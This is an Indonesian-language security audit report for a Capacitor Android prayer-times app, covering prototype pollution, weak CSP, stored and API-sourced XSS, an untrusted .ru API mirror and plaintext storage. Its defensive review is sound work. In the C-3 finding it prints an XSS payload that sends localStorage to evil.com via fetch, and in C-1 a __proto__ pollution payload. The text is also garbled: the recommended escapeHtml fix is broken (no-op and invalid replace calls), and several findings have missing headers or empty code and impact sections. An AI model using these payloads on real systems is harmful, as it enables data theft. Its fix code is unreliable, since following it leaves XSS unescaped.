KRITIS C-1 · Prototype Pollution via Manipulasi Storage Persisten ▼
File: src/js/core/store.js — fungsi _mergeConfig() CWE: CWE-915 (Improperly Controlled Modification of Dynamically-Determined Object)

Deskripsi

Fungsi _mergeConfig() yang digunakan untuk menggabungkan state tersimpan dari Capacitor Preferences ke state aplikasi menggunakan for...in loop dan bracket notation untuk assignment. Ini membuka celah prototype pollution.

Pada Capacitor Android, data Preferences disimpan di SharedPreferences yang dapat dimanipulasi di perangkat yang di-root. Jika penyerang menyisipkan JSON dengan key "__proto__", maka Object.prototype bisa tercemar.

// src/js/core/store.js
_mergeConfig(target, source) {
    const result = { ...target };
    for (const key in source) {          // ← iterates enumerable props termasuk __proto__
        if (source[key] && typeof source[key] === 'object' && !Array.isArray(source[key])) {
            result[key] = this._mergeConfig(target[key] || {}, source[key]);
        } else {
            result[key] = source[key];   // ← result["__proto__"] = ... mengubah prototype!
        }
    }
    return result;
}

Payload berbahaya di storage:

// Jika SharedPreferences berisi:
{"__proto__": {"isAdmin": true, "malicious": "<script>alert(1)</script>"}}

// Setelah _mergeConfig dipanggil:
console.log({}.isAdmin);   // → true  (Object.prototype terkontaminasi)
console.log({}.malicious); // → "<script>..."

Dampak

  • Kontaminasi Object.prototype mempengaruhi seluruh runtime JavaScript aplikasi
  • Dapat memanipulasi logika aplikasi (melewati pemeriksaan kondisi, mengubah perilaku fungsi)
  • Bisa menjadi stepping stone untuk serangan lanjutan termasuk XSS jika nilai yang tercemar dirender ke DOM
  • Meski membutuhkan akses root atau manipulasi storage, ini tetap merupakan attack surface yang valid
Rekomendasi Perbaikan Tambahkan guard untuk key berbahaya dan gunakan Object.hasOwn(), serta pertimbangkan menggunakan structuredClone(): 
_mergeConfig(target, source) {
    const FORBIDDEN_KEYS = new Set(['__proto__', 'constructor', 'prototype']);
    const result = Object.create(null);  // atau { ...target }
    Object.assign(result, target);
    for (const key of Object.keys(source)) { // Object.keys() tidak iterasi prototype
        if (FORBIDDEN_KEYS.has(key)) continue;
        if (source[key] !== null && typeof source[key] === 'object' && !Array.isArray(source[key])) {
            result[key] = this._mergeConfig(target[key] || {}, source[key]);
        } else {
            result[key] = source[key];
        }
    }
    return result;
}
KRITIS C-2 · Content Security Policy Tidak Efektif — 'unsafe-inline' dan 'unsafe-eval' ▼
File: index.html — meta tag CSP CWE: CWE-1021 (Improper Restriction of Rendered UI Layers)

Deskripsi

CSP saat ini mengandung 'unsafe-inline' dan 'unsafe-eval' di direktif script-src dan default-src, yang sepenuhnya meniadakan perlindungan XSS yang seharusnya diberikan oleh CSP.

<!-- index.html — CSP saat ini -->
<meta http-equiv="Content-Security-Policy" content="
  default-src 'self' data: gap: https://ssl.gstatic.com 'unsafe-inline' 'unsafe-eval';
  script-src  'self' 'unsafe-inline' 'unsafe-eval';
  ...
"/>

Dampak

  • Jika ada XSS dari sumber manapun, tidak ada mitigasi dari CSP — script injeksi langsung dieksekusi
  • 'unsafe-eval' mengizinkan eval(), new Function(), setTimeout("string") — meningkatkan attack surface secara signifikan
  • Inline event handler seperti onclick="..." di empty-state.js dapat dieksploitasi
  • Play Store / Google Play Protect semakin ketat terhadap CSP yang lemah untuk app WebView
Rekomendasi Perbaikan Hapus 'unsafe-inline' dan 'unsafe-eval'. Ganti inline event handler dengan addEventListener(). Jika bundler (Vite) menggunakan eval, gunakan 'strict-dynamic' dengan nonce atau hash: 
<!-- CSP yang lebih aman (sesuaikan dengan kebutuhan Capacitor) -->
default-src 'self';
script-src  'self' 'nonce-{nonce}';
style-src   'self' 'unsafe-inline';  <!-- style masih perlu unsafe-inline untuk CSS-in-JS -->
connect-src 'self' https://api.aladhan.com https://*.openstreetmap.org;
img-src     'self' data: blob: https://*.openstreetmap.org;
font-src    'self' data:;
KRITIS C-3 · Stored XSS via Input Pengguna di Preset Manager ▼
File: src/js/components/modal/preset-manager-modal.js — renderPresetItem(), showEditForm() CWE: CWE-79 (Cross-site Scripting — Stored)

Deskripsi

Pengguna dapat memasukkan nama organisasi dan deskripsi preset kustom melalui form input. Data ini disimpan ke Capacitor Preferences, kemudian dirender kembali ke DOM melalui innerHTML tanpa sanitasi apapun.

// renderPresetItem() — data langsung ke innerHTML tanpa escaping
`<div class="preset-mgr-item-name">
    ${preset.name}         // ← TIDAK DISANITASI — Stored XSS
    ${activeBadge}
</div>`

// showEditForm() — nilai user di atribut HTML
`<input ... value="${preset.name}" ...>`  // ← bisa merusak atribut jika mengandung "
`<input ... value="${preset.description || ''}" ...>` // ← sama

Skenario Serangan

Pengguna (atau script lain yang bisa menulis ke storage) memasukkan nama preset:

// Input nama preset:
<img src=x onerror="fetch('https://evil.com?d='+JSON.stringify(localStorage))">

// Saat renderPresetItem() dipanggil, innerHTML menjadi:
<div class="preset-mgr-item-name">
    <img src=x onerror="fetch('https://evil.com?...')">   // ← DIEKSEKUSI
</div>

Dalam konteks Capacitor/WebView, serangan ini bisa mengakses semua state aplikasi, sessionStorage, dan memanggil Capacitor plugin bridge jika ada jembatan yang tidak terlindungi.

Dampak

  • Eksekusi JavaScript arbitrary dalam konteks aplikasi
  • Akses ke seluruh data di memori aplikasi dan storage
  • Potensi pivoting ke native layer via Capacitor plugin bridge
  • Serangan ini persisten — dieksekusi setiap kali preset manager dibuka
Rekomendasi Perbaikan Buat fungsi escapeHtml() dan terapkan ke SEMUA data user yang dirender via innerHTML: 
// utils/sanitize.js
export function escapeHtml(str) {
    if (str == null) return '';
    return String(str)
        .replace(/&/g, '&')
        .replace(//g, '>')
        .replace(/"/g, '"')
        .replace(/'/g, ''');
}

// Penggunaan di renderPresetItem:
`<div class="preset-mgr-item-name">${escapeHtml(preset.name)}</div>`

// Untuk input value di atribut HTML:
`<input value="${escapeHtml(preset.name)}">`

// ATAU — gunakan textContent / createElement (lebih aman):
const nameEl = document.createElement('div');
nameEl.textContent = preset.name;  // otomatis aman
container.appendChild(nameEl);

TINGGI H-1 · XSS via Data Nominatim API — Location Search Modal ▼
File: src/js/components/modal/location-search-modal.js — renderResultItem() CWE: CWE-79 (Cross-site Scripting — Reflected/Stored from External Source)

Deskripsi

Data dari Nominatim OpenStreetMap API (nama lokasi, nama provinsi) dirender langsung ke DOM melalui innerHTML tanpa sanitasi. Meskipun Nominatim adalah layanan terpercaya, data OpenStreetMap bersifat user-contributed — siapapun bisa berkontribusi nama lokasi yang mengandung HTML.

// renderResultItem() — data API langsung ke innerHTML
function renderResultItem(location) {
    const displayName = location.districtName
        ? `${location.districtName}, ${location.regencyName}`  // ← tidak di-escape
        : location.regencyName;
    return `
        <div class="loc-search-item">
            <div class="loc-search-item-title">${displayName}</div>     // ← RENTAN
            <div class="loc-search-item-subtitle">${location.provinceName || ''}...</div>  // ← RENTAN
        </div>
    `;
}

Dampak

  • Jika ada entry di OpenStreetMap dengan nama yang mengandung HTML, setiap pengguna yang mencari lokasi tersebut akan ter-eksploit
  • Serangan supply-chain: kompromi server Nominatim → injeksi XSS ke semua pengguna aplikasi
Rekomendasi Perbaikan Terapkan escapeHtml() ke semua data dari Nominatim sebelum dimasukkan ke template string innerHTML.

TINGGI H-4 · XSS via Data API Aladhan — Schedule Card ▼
File: src/js/components/card/schedule-card.js — renderDateNav(), updateScheduleContent()

Deskripsi

Data dari API Aladhan (nama hari Hijri, nama bulan, nama hari dalam seminggu) dirender langsung ke innerHTML. Meskipun Aladhan adalah API terpercaya, ini membuka vektor supply-chain attack.

// renderDateNav() — data dari API ke innerHTML
`<span class="schedule-nav__title">
    ${hijriDay} ${hijriMonthName} ${hijriYear}  // ← tidak di-escape
</span>`

// updateScheduleContent() — data dari i18n DAN API
`${t('components/ui/header:days', ...)[entry.date.getDay()]}` // ← dari i18n, lebih aman
`${formatGregorianDateFromObj(entry.date, months)}`  // ← dari i18n, lebih aman
// tapi:
titleEl.textContent = `${entry.hijriDay} ${entry.hijriMonthName} ${entry.hijriYear}`;
// ← ini textContent (AMAN!) — tapi versi renderDateNav menggunakan innerHTML (TIDAK AMAN)

Catatan Penting

Inkonsistensi terdeteksi: beberapa tempat menggunakan textContent (aman) tapi template string awal menggunakan innerHTML dengan data yang sama (tidak aman). Ini menunjukkan pola yang tidak konsisten di seluruh kodebase.

Rekomendasi Perbaikan Standarisasi: selalu gunakan escapeHtml() untuk data yang berasal dari API eksternal saat dimasukkan ke template literal innerHTML.

Deskripsi

Nama surah, tipe, dan jumlah ayat dari file JSON lokal dirender melalui innerHTML. Meskipun saat ini file JSON adalah bundled resource (aman), pola ini membentuk kebiasaan yang berbahaya dan jika ada mekanisme update file JSON di masa depan, ini menjadi attack surface.

// createSurahCard()
card.innerHTML = `
    <div class="surah-title-latin">${surah.title}</div>       // ← innerHTML tanpa escape

TINGGI H-6 · Notification Module Menggunakan innerHTML untuk Message ▼
File: src/js/modules/notification/notification.js — show()

Deskripsi

Fungsi notifikasi in-app menggunakan innerHTML untuk merender pesan. Meskipun sebagian besar pesan melalui i18next (dengan escapeValue: true), ada jalur di mana pesan bisa mengandung data tidak ter-escape.

// notification.js
el.innerHTML = `
    <span class="notif__icon">${icon}</span>
    <span class="notif__message">${message}</span>  // ← innerHTML!
`;

// Contoh pemanggilan yang potensial rentan:
notif.success(t('...', { name: displayName }));
// Jika displayName = '<img src=x onerror=alert(1)>'
// i18next dengan escapeValue:true AKAN men-escape ini → aman
// TAPI jika ada pemanggilan langsung tanpa melalui t():
notif.show(rawUserData);  // ← jika ada, ini berbahaya

Catatan

Saat ini sebagian besar pemanggilan melalui i18next yang melakukan escaping. Namun menggunakan innerHTML untuk pesan notifikasi adalah anti-pattern yang berbahaya — sangat mudah lupa melakukan escaping saat menambah kode baru di masa depan.

Rekomendasi Perbaikan Ganti innerHTML dengan textContent untuk bagian message, atau pastikan semua pesan di-escape. Gunakan innerText atau textContent untuk message teks biasa.
TINGGI H-7 · API Mirror dari Domain Tidak Terverifikasi (alislam.ru) ▼
File: src/js/core/api.js — konstanta API_MIRRORS CWE: CWE-494 (Download of Code Without Integrity Check)

Deskripsi

Aplikasi menggunakan tiga API mirror, salah satunya berasal dari domain .ru yang tidak memiliki asosiasi resmi yang jelas dengan Aladhan:

const API_MIRRORS = [
    'https://api.aladhan.com/v1',
    'https://aladhan.api.islamic.network/v1',
    'https://aladhan.api.alislam.ru/v1',  // ← domain tidak terverifikasi
];

Jika mirror ini dikompromikan atau dioperasikan dengan itikad buruk, ia dapat mengembalikan data waktu sholat yang salah. Validasi hanya memeriksa struktur respons, bukan keaslian konten.

Dampak

  • Waktu sholat yang diberikan bisa salah (misal imsak dipercepat, maghrib diperlambat) — ini secara langsung berdampak pada ibadah pengguna
  • Dalam skenario terburuk, data berbahaya bisa berujung ke XSS jika ada celah di rendering
Rekomendasi Perbaikan Hapus mirror yang tidak terverifikasi. Jika butuh redundansi, gunakan hanya mirror resmi yang terdaftar di dokumentasi Aladhan API. Tambahkan validasi konten (range check untuk nilai waktu, misalnya memeriksa apakah jam imsak berada dalam rentang yang masuk akal).

Penting untuk diperbaiki sebelum atau segera setelah release. Meningkatkan permukaan serangan secara signifikan.

SEDANG M-1 · Fungsi Callback Ter-expose di Window Global ▼
File: src/js/pages/home-page.js CWE: CWE-668 (Exposure of Resource to Wrong Sphere)

Deskripsi

Sebuah fungsi callback diekspos ke objek window global untuk digunakan dalam inline event handler. Ini mengekspos logika internal aplikasi ke konteks global yang bisa diakses oleh script lain atau via XSS.

// home-page.js
if (!window._homeShowManualSearch) {

        showLocationSearchModal({ ... });
    };
}

// Digunakan sebagai inline onclick:

Dampak

  • Menandai pola arsitektur yang buruk yang bisa meluas jika tidak diatasi
Rekomendasi Perbaikan Hapus inline onclick dan ganti dengan addEventListener: 
// Di empty-state.js, hapus onclick prop atau gunakan data attribute:
// Setelah render, bind event:
container.querySelector('.empty-state__btn--secondary')

SEDANG M-2 · Inline Event Handler di Empty State Component ▼
File: src/js/components/ui/empty-state.js

Deskripsi

Komponen renderEmptyState() menerima action.onclick sebagai string yang dimasukkan langsung ke atribut onclick HTML. Ini adalah pola yang sangat berbahaya.

// empty-state.js
export function renderEmptyState({ ..., action, secondaryAction }) {
    return `
        <button ...${action.onclick ? ` onclick="${action.onclick}"` : ''}>
    `;
}

// Caller dari home-page.js:
action: {
    label: t('retry'),
    icon: 'bx-refresh',
    onclick: 'location.reload()',  // ← string hardcoded, saat ini aman
},
secondaryAction: {
    onclick: '_homeShowManualSearch()',  // ← bergantung pada global function
},

Masalah

  • Pola menerima string sebagai event handler sangat rentan jika action.onclick pernah berasal dari input pengguna atau data eksternal
  • Bertentangan dengan CSP yang baik (membutuhkan 'unsafe-inline')
  • Bisa dieksploitasi jika ada path code yang tidak terduga mengisi onclick dengan data dinamis
Rekomendasi Perbaikan Ganti model onclick-string dengan callback function. Render button tanpa onclick, kemudian bind event secara programatik setelah rendering selesai.
SEDANG M-3 · Tidak Ada Validasi Integritas Konten Response API ▼
File: src/js/core/api.js — isValidResponse(), isValidMonthlyResponse() CWE: CWE-20 (Improper Input Validation)

Deskripsi

Validasi API hanya memeriksa struktur/keberadaan field, tidak memeriksa apakah nilai waktu sholat berada dalam rentang yang masuk akal:

function isValidResponse(data) {
    if (data?.code !== 200 || !data?.data?.timings) return false;
    const timings = data.data.timings;
    return REQUIRED_KEYS.every(key =>
        typeof timings[key] === 'string' && timings[key].length > 0
        // ← tidak ada range check! "99:99" atau "<script>" lolos validasi ini
    );
}

Dampak

  • API yang dikompromikan dapat mengirim string waktu yang tidak valid namun lolos validasi
  • String berbahaya seperti HTML/JS bisa lolos masuk ke state aplikasi lalu dirender
  • Nilai waktu yang ekstrem (imsak = 01:00, isya = 23:59) bisa menyesatkan pengguna tanpa terdeteksi
Rekomendasi Perbaikan Tambahkan validasi format dan range: 
function isValidTimeString(str) {
    if (typeof str !== 'string') return false;
    const clean = str.replace(/\s*\(.*\)/, '').trim();
    const match = clean.match(/^(\d{1,2}):(\d{2})$/);
    if (!match) return false;
    const h = parseInt(match[1]), m = parseInt(match[2]);
    return h >= 0 && h <= 23 && m >= 0 && m <= 59;
}
// Terapkan ke setiap key di validasi response

console.log(`[API] Qibla direction: ${direction}° via ${mirror}`);
console.warn(`[API] Mirror failed: ${mirror} — ${err.message}`);

// store.js — mengekspos struktur state:
// (tidak langsung, tapi error object bisa mengandung data state)

// compass.js:

// app.js:

Dampak

  • Mengekspos arsitektur internal, URL API, dan informasi sensitif lainnya

SEDANG M-5 · Data Storage Tidak Terenkripsi & Tidak Ada Integrity Check ▼
File: src/js/core/storage.js, src/js/core/store.js CWE: CWE-312 (Cleartext Storage of Sensitive Information)

Deskripsi

State aplikasi (termasuk lokasi GPS pengguna, preset Ramadhan kustom, preferensi) disimpan sebagai JSON plaintext di Capacitor Preferences (SharedPreferences pada Android). Tidak ada enkripsi atau HMAC untuk integritas data.

// storage.js — disimpan sebagai JSON plaintext
export async function set(key, value) {
    await Preferences.set({
        key: PREFIX + key,
        value: JSON.stringify(value),  // ← plaintext, tidak ada enkripsi/signing
    });
}

Dampak

  • Di perangkat rooted, semua data dapat dibaca dan dimanipulasi tanpa enkripsi
  • Manipulasi data storage bisa menyebabkan Prototype Pollution (C-1) atau XSS (C-3)
  • Lokasi GPS pengguna tersimpan plaintext dan bisa diakses oleh aplikasi lain dengan root
Rekomendasi Perbaikan Untuk data sensitif (lokasi), gunakan CapacitorSecurePreferences atau Android Keystore-backed encrypted storage. Tambahkan HMAC untuk mendeteksi tampering pada state kritis. Minimal, validasi semua data yang dimuat dari storage sebelum digunakan.
SEDANG M-6 · Tidak Ada Sanitasi pada Nilai Waktu Sebelum Dirender ke DOM ▼
File: src/js/components/card/prayer-card.js, schedule-card.js, prayer-list.js

Deskripsi

String waktu sholat dari API dirender langsung ke template innerHTML. Fungsi cleanTime() hanya menghapus timezone suffix, tidak melakukan sanitasi HTML.

// prayer-card.js — renderSingleTube()
`<div class="tube__time">${cleanTime(time)}</div>`   // ← innerHTML dengan data API

// cleanTime() hanya:
function cleanTime(timeStr) {
    return timeStr.replace(/\s*\(.*\)/, '');  // ← hanya buang timezone, tidak escape HTML
}

Dampak

Rekomendasi Perbaikan Setelah cleanTime(), tambahkan validasi format waktu (hanya izinkan string yang cocok dengan /^\d{2}:\d{2}$/) dan escaping sebelum masuk ke template.

    <div class="confirm-dialog">

SEDANG M-8 · Penggunaan for...in Tanpa hasOwnProperty di Beberapa Lokasi ▼
File: src/js/core/store.js dan beberapa utilitas

Deskripsi

Selain masalah prototype pollution di C-1, penggunaan for...in tanpa pemeriksaan hasOwnProperty atau Object.hasOwn() bisa menyebabkan iterasi ke properti yang diwarisi dari prototype jika prototype pollution sudah terjadi.

// store.js
for (const key in source) {
    // Tanpa: if (!Object.hasOwn(source, key)) continue;
    // ← Jika prototype sudah ter-polute, properti inherited ikut diiterasi
}
Rekomendasi Perbaikan Gunakan Object.keys(source) atau tambahkan if (!Object.hasOwn(source, key)) continue; di awal setiap for...in loop.

INFO I-1 · Tidak Ada Pemisahan antara Data Trusted dan Untrusted di State Management ▼

Deskripsi

Store aplikasi menggabungkan semua data dalam satu objek state tanpa membedakan mana data yang berasal dari sumber terpercaya (hardcoded, i18n) dan mana yang tidak (API eksternal, input pengguna). Ini membuat sanitasi yang konsisten lebih sulit.

INFO I-2 · Inkonsistensi Penggunaan textContent vs innerHTML di Kodebase ▼

Deskripsi

Kodebase sangat inkonsisten dalam penggunaan textContent (aman) vs innerHTML (berpotensi berbahaya). Sebagian lokasi sudah benar menggunakan textContent, sementara sebagian besar template string menggunakan innerHTML.

// AMAN — sudah benar di beberapa tempat:
arabicEl.textContent = ayah.arabic;           // quran-reader.js
translationEl.textContent = ayah.translation; // quran-reader.js
nameEl.textContent = preset.name;             // beberapa tempat

// TIDAK AMAN — pola dominan:
container.innerHTML = `...${externalData}...`;  // mayoritas komponen
Rekomendasi Buat panduan internal: "Gunakan textContent/createElement by default. innerHTML HANYA untuk konten yang sudah diverifikasi aman (misalnya dari i18next yang sudah di-escape, atau HTML hardcoded). SELALU gunakan escapeHtml() untuk data dinamis di innerHTML."
INFO I-3 · Capacitor WebView — Konfigurasi Keamanan Native Perlu Diverifikasi ▼

Deskripsi

Keamanan aplikasi Capacitor juga bergantung pada konfigurasi Android native yang tidak terlihat dalam kode yang diberikan. Beberapa hal yang perlu diverifikasi:

  • android:allowBackup="false" di AndroidManifest.xml — jika true, data aplikasi bisa di-backup oleh penyerang
  • android:debuggable="false" di build release — jika true, WebView bisa di-inspect via Chrome DevTools
  • Konfigurasi setMixedContentMode di WebView — jangan izinkan mixed content
  • Network Security Config untuk certificate pinning — tidak ada bukti pinning di kode yang diberikan
  • android:usesCleartextTraffic="false" — semua traffic harus HTTPS
Rekomendasi Audit AndroidManifest.xml, capacitor.config.ts, dan android/app/src/main/res/xml/network_security_config.xml untuk memastikan konfigurasi native sudah aman.
INFO I-4 · Tidak Ada Mekanisme Deteksi Tampering / Root Detection ▼

Deskripsi

Aplikasi tidak memiliki mekanisme untuk mendeteksi apakah berjalan di perangkat yang di-root atau di emulator. Di perangkat yang di-root, banyak perlindungan keamanan (SharedPreferences isolation, dll) bisa dilewati.

Rekomendasi Pertimbangkan integrasi library seperti RootBeer (Android) untuk deteksi root. Untuk Play Store, pertimbangkan mengintegrasikan Google Play Integrity API untuk memverifikasi integritas perangkat dan aplikasi.
